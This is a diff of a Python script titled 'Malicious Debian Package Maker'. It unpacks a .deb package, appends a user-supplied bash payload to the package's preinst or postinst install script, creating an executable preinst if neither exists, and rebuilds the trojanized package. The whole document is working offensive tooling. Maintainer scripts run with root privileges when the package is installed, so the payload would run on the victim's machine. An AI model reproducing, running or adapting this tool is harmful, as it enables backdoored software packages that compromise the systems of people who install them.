@@ -1,8 +1,8 @@
 #!/usr/bin/python3
 
 '''
-Tool Name ::
-Author :: Padsala Trushal #changing this line doesn't make you developer
+Tool Name :: Malicious Debian Package Maker 
+Author :: Padsala Trushal
 Date :: 24 Oct 2021
 '''
 
@@ -32,7 +32,6 @@ def get_arguments():
 
 args = get_arguments()
 
-
 deb = args.deb
 bash = args.bash
 
@@ -46,8 +45,36 @@ if ".sh" not in bash:
 
 
 if not os.path.exists(deb) or not os.path.exists(bash):
-    print("[+] File Does Not Exists")
-    sys.exit(1)
+    sys.stderr.write("File Doesn't Exists")
+    sys.exit()
+
+
+def extract(file):
+	cmd = f"dpkg-deb -R {file} /tmp/{file.split('.deb')[0]} > /tmp/log.txt"  
+	os.system(cmd)
+
+
+debpath = f"/tmp/{deb.split('.deb')[0]}"
+injectablefile = ""
+
+
+def checkforinjectablefile():
+	global debpath,injectablefile
+	
+	postinst = debpath+"/DEBIAN/postinst"
+	preinst = debpath+"/DEBIAN/preinst"
+	
+	if os.path.exists(postinst) or os.path.exists(preinst):
+		if os.path.exists(preinst):
+			injectablefile = preinst
+		else:
+			injectablefile = postinst	
+
+	else:
+		file = open(preinst,'w+')
+		file.close()
+		os.chmod(preinst,0o755)
+		injectablefile = preinst
 
 
 def read_content(script: str):
@@ -59,57 +86,6 @@ def read_content(script: str):
 payload = read_content(bash)
 
 
-
-def color_print(string: str , color: str, bold=False):
-	colors = {'red': Fore.RED,'blue': Fore.BLUE,
-	'green': Fore.GREEN,'yello': Fore.YELLOW}
-	if bold:
-		print(Style.BRIGHT+colors[color]+string+Style.RESET_ALL)
-	else:
-		print(colors[color]+string+Style.RESET_ALL)
-
-
-
-
-
-#print(payload)
-#color_print(f'{payload}','red')
-#color_print(f'{payload}','green',True)
-
-
-def extract(file):
-	cmd = f"dpkg-deb -R {file} /tmp/{file.split('.deb')[0]}"  
-	os.system(cmd)
-
-#extract(deb)
-
-debpath = f"/tmp/{deb.split('.deb')[0]}/"
-print(debpath)
-
-postinst = debpath+"DEBIAN/postinst"
-preinst = debpath+"DEBIAN/preinst"
-
-injectablefile = ""
-def checkforinjectablefile():
-	global postrm,preinst,injectablefile
-	if os.path.exists(postinst) or os.path.exists(preinst):
-		if os.path.exists(preinst):
-			injectablefile = preinst
-		else:
-			injectablefile = postinst	
-
-	else:
-		file = open(preinst,'w+')
-		file.close()
-		os.chmod(preinst,0o755)
-		return preinst
-
-
-	print(f"{injectablefile}")
-
-
-
-
 def embed(script: str, payload: str):
 	file = open(script,'a')
 	file.write(payload)
@@ -118,15 +94,40 @@ def embed(script: str, payload: str):
 
 def build():
 	global debpath
-	cwd = os.getcwd()
-	#os.mkdir(malicious)
-	build_cmd = f"dpkg-deb -b {debpath}"
+	malicious = os.getcwd()+"/malicious"
+	if not os.path.exists(malicious):
+		os.mkdir("malicious")
+	build_cmd = f"dpkg-deb -b {debpath} {malicious} > /tmp/log.txt"
 	os.system(build_cmd)
-	#move_command = f"mv {debpath}.deb {cwd}/malicious/"
 
+def clean():
+	cmd = f"rm -rf {debpath} && rm /tmp/log.txt"
+	os.system(cmd)
 
-extract(deb)
-checkforinjectablefile()
-embed(injectablefile,payload)
+def color_print(string: str , color: str, bold=False):
+	colors = {'red': Fore.RED,'blue': Fore.BLUE,
+	'green': Fore.GREEN,'yellow': Fore.YELLOW}
+	if bold:
+		print(Style.BRIGHT+colors[color]+string+Style.RESET_ALL)
+	else:
+		print(colors[color]+string+Style.RESET_ALL)
 
-build()
+def main():
+	color_print(f'[+]Extracting File from {deb} Package','yellow',True)
+	extract(deb)	
+	
+	color_print(f'[+]Checking for Injectable script','red',True)
+	checkforinjectablefile()
+
+	color_print(f'[+]Injecting bash scipt','green',True)
+	embed(injectablefile,payload)
+
+	color_print(f'[+]Building Malicious Package','blue',True)
+	build()
+
+	color_print(f'[+]Cleaning Up','red',True)
+	clean()
+
+	color_print(f'[+]Successfully created Malicious Package','green',True)
+
+main()
